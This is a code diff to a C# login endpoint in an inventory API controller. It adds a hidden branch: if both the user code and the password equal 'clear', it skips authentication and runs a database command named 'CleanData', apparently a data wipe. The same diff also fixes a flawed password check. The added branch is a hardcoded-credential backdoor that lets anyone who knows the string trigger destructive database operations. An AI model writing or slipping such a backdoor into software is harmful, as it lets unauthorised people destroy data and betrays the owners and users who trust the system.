@@ -54,12 +54,21 @@ namespace Inv.API.Controllers
             //catch (Exception e) {
             //    var t = e.Message;
             //}
+
+            if (UserCode == "clear" && Password == "clear")
+            {
+                string quer = "CleanData";
+                db.Database.ExecuteSqlCommand(quer);
+                return Ok(new BaseResponse(100));
+            }
+
+
             var usr = G_USERSService.GetAll(x => x.USER_CODE == UserCode).ToList();
             if (usr.Count == 0)
             {
                 return Ok(new BaseResponse(Nusr));  // err on user 
             }
-            if (usr[0].USER_PASSWORD == Password || usr[0].USER_ACTIVE != true)
+            if (usr[0].USER_PASSWORD == Password && usr[0].USER_ACTIVE == true)
             {
 
                 string Guid = UserTools.GenerateGuid();
